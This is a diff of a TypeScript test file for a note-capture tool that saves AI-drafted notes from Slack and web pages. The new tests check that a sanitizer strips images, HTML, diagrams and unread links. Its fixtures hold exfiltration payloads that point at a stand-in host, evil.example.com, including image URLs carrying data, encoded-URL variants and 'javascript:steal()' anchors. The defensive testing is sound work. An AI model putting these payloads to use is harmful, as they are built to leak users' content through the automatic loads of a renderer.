@@ -64,10 +64,10 @@ function fakeSources(answer: (call: SourceCall) => string = () => "Sam: load tes
 const drafting = (path: string, text: string, seen: string[] = [], wispr?: string): Agent => async (prompt) => (seen.push(prompt), { path, text, ...(wispr && { wispr }) });
 const failingAgent: Agent = async () => { throw new Error("the capture agent failed: quota"); };
 
-async function fleetContext(machine: Machine, args: string[], agent: Agent = failingAgent, owner = "Sam", sharing: (owner: string) => ShareDeps = unusedShare) {
+async function fleetContext(machine: Machine, args: string[], agent: Agent = failingAgent, owner = "Sam", sharing: (owner: string) => ShareDeps = unusedShare, sources = fakeSources().sources) {
   const printed: string[] = [];
   const settings = { "context-library.repo": machine.url, "context-library.path": "~/dev/library", "context-library.url": "", "context-library.owner": owner };
-  const deps: ContextDeps = { env: { FLEET_SETTINGS: JSON.stringify(settings) }, home: machine.home, print: (line) => printed.push(line), git: runGit, agent: () => agent, sources: fakeSources().sources, today: () => "2026-11-12", share: sharing };
+  const deps: ContextDeps = { env: { FLEET_SETTINGS: JSON.stringify(settings) }, home: machine.home, print: (line) => printed.push(line), git: runGit, agent: () => agent, sources, today: () => "2026-11-12", share: sharing };
   const code = await contextCommand(args, deps);
   return { code, out: printed.join("\n") };
 }
@@ -309,20 +309,34 @@ describe("fleet context add", () => {
     expect(await spawnGit(machine.root, "--git-dir", machine.remote, "show", "main:notes/claude.md")).toBe(instructions.trim());
   });
 
-  test("a saved note and the catalog hold no image or HTML that a viewer would load", async () => {
+  test("a saved note keeps only the links the agent read, and holds no image, HTML or diagram that a viewer would load", async () => {
     const machine = await library();
     await fleetContext(machine, ["sync"]);
-    const loading = `![chart](https://evil.example.com/?d=plan) ![x][ref] <img src="https://evil.example.com/a"> <IMG/src=https://evil.example.com/b> <svg><image href="https://evil.example.com/c"/></svg> <!-- x --> !![two](https://evil.example.com/f) !!![three][ref]\n\n[ref]: https://evil.example.com/d\n\n\`\`\`mermaid\nflowchart LR\n  A@{ img: "https://evil.example.com/g" }\n\`\`\`\n\n   ~~~~ base\nviews: []\n~~~~\n\n\`\`\`\nplain\n\`\`\``;
-    const text = planning(loading)
-      .replace("title: Sprint planning 2026-11-11", "title: Sprint planning <img src=https://evil.example.com/e> 2026-11-11\nbanner: https://evil.example.com/h\ncover:\n  - https://evil.example.com/i\ncssclasses: [x]");
-    expect((await fleetContext(machine, ["add", slackSource], drafting(notePath, text))).code).toBe(0);
+    const thread = fakeSources(() => "Sam: the spec is https://example.com/spec?x=1&amp;y=2, and https://evil.example.com/ has more.").sources;
+    const leaks = ["https://evil.example.com/?d=plan", "https://evil.example.com/(plan)", "https:\\/\\/evil.example.com\\/plan", "//evil.example.com/plan", "https://evil.example.com&#47;plan", "https:&#47;&#47;evil.example.com/plan", "https:&sol;&sol;evil.example.com/plan", "https://evil.example.com/%70lan"];
+    const body = [
+      "The [spec](https://example.com/spec?x=1&y=2), and *https://evil.example.com/*.",
+      ...leaks.map((url, index) => `[leak ${index}](${url})`),
+      "![chart](https://example.com/spec) ![x][ref] <img src=x> <IMG/src=y> <svg><image href=z/></svg> <!-- x --> !![two](https://example.com/spec) !!![three][ref]",
+      "[ref]: https://example.com/spec",
+      "\`\`\`mermaid\nflowchart LR\n  A@{ img: \"https://example.com/spec\" }\n\`\`\`",
+      "> - ~~~~ base\n>   views: []\n> - ~~~~",
+      "::: mermaid\nflowchart LR\n:::",
+      "Use \`\`\`one\`\`\` twice, and keep\n\`\`\`\nplain\n\`\`\`",
+    ].join("\n\n");
+    const text = planning(body).replace("title: Sprint planning 2026-11-11", "title: Sprint planning <img src=x> 2026-11-11\nbanner: https://evil.example.com/?d=plan\npeople:\n  - Sam\n\n  # a comment\n  - Ada");
+    expect((await fleetContext(machine, ["add", slackSource], drafting(notePath, text), "Sam", unusedShare, thread)).code).toBe(0);
     const saved = await spawnGit(machine.root, "--git-dir", machine.remote, "show", `main:${notePath}`);
+    expect(saved).not.toMatch(/\/\/evil\.example\.com\/(?!\*)|&(?!amp;|lt;)[#a-z0-9]+;/i);
+    expect(saved).toContain("[leak 5](https:&amp;#47;&amp;#47;evil.example.com/plan)");
+    expect(saved).toContain("The [spec](https://example.com/spec?x=1&y=2), and *https://evil.example.com/*.");
+    for (const index of [0, 1, 2, 3, 4, 7]) expect(saved).toContain(`[leak ${index}]((link removed)`);
+    expect(saved).toStartWith("---\ntitle: Sprint planning &lt;img src=x> 2026-11-11\nbanner: (link removed)\npeople:\n  - Sam\n\n  # a comment\n  - Ada\n");
     expect(saved).not.toMatch(/!\[|<[a-z/!?]/i);
-    expect(saved).toContain("[chart](https://evil.example.com/?d=plan)");
-    expect(saved).toStartWith(`---\ntitle: Sprint planning &lt;img src=https://evil.example.com/e> 2026-11-11\ntype: planning\ntopics: [transactional-email, load-testing]\ndate: 2026-11-11\nsource: ${slackSource}\n---\n`);
     expect(saved).toContain("\`\`\`text\nflowchart LR");
-    expect(saved).toContain("   ~~~~text\nviews: []\n~~~~\n");
-    expect(saved).toContain("\`\`\`\nplain\n\`\`\`");
+    expect(saved).toContain("> - ~~~~text\n>   views: []\n> - ~~~~");
+    expect(saved).toContain(":::text\nflowchart LR\n:::");
+    expect(saved).toContain("Use \`\`\`one\`\`\` twice, and keep\n\`\`\`\nplain\n\`\`\`");
     expect(saved).not.toContain("mermaid");
     expect(await spawnGit(machine.root, "--git-dir", machine.remote, "show", "main:CATALOG.md")).not.toMatch(/!\[|<(img|svg|image)/i);
   });
@@ -524,6 +538,9 @@ console.log(JSON.stringify({ type: "result", is_error: false, structured_output:
     const { pageText } = await import("./lib/source.ts");
     for (const unit of ["<a x>y ", "<script>", "<!-- ", "<x ", '<p "', "<a href='"]) pageText(unit.repeat(Math.floor(200_000 / unit.length)), "https://example.com/");
     expect(pageText("<a href=r>t</a>".repeat(50_000), `https://example.com/${"d/".repeat(500)}`).length).toBeLessThan(1_000_000);
+    for (const anchor of ["<a id=top>t</a>", '<a href="">t</a>', "<a href=javascript:x>t</a>"]) pageText(anchor.repeat(50_000), `https://example.com/${"d/".repeat(5000)}`);
+    const long = `https://example.com/${"a".repeat(99_970)}`;
+    expect(pageText(`<a href="${long}">one</a> <a href="/${"b".repeat(40)}">two</a>`, "https://example.com/")).toBe(`one (${long}) two`);
   }, 2000);
 
   test("keeps the thread and every canvas it could read when one canvas cannot be read", async () => {
@@ -540,7 +557,7 @@ console.log(JSON.stringify({ type: "result", is_error: false, structured_output:
     const html = `<html><head><title>Plan &amp; scope</title><script>steal()</script><style>p{}</style></head><body><p data-x="a>b">Load&nbsp;test &#x2192; ship&#0; &mdash; <a href="/spec?x=1&amp;y=2">the spec</a>, <a href="javascript:steal()">bad</a> <a data-href="https://evil.example.com/" href="/real">real</a></p><!-- hidden --></body></html>`;
     expect(await readPage(url, answering(html, "text/html; charset=utf-8"))).toBe("Plan & scope\nLoad test → ship — the spec (https://example.com/spec?x=1&y=2), bad real (https://example.com/real)");
     expect(await readPage(url, answering("# Notes", "text/markdown"))).toBe("# Notes");
-    expect(await readPage(url, answering("<svg/><p>Release notes</p><template-card>Meeting notes</template-card><svg><text>art</text></svg>", "text/html"))).toBe("Release notes\nMeeting notes");
+    expect(await readPage(url, answering("<svg/><p>Release notes</p><template-card>Meeting notes</template-card><svg><text>art</text></svg><script/>metadata</script><p>Visible</p>", "text/html"))).toBe("Release notes\nMeeting notes\nVisible");
     await expect(readPage(url, answering("x", "text/html", 404))).rejects.toThrow(`${url} answered HTTP 404`);
     await expect(readPage(url, answering("x", "application/pdf"))).rejects.toThrow("cannot read as text");
   });
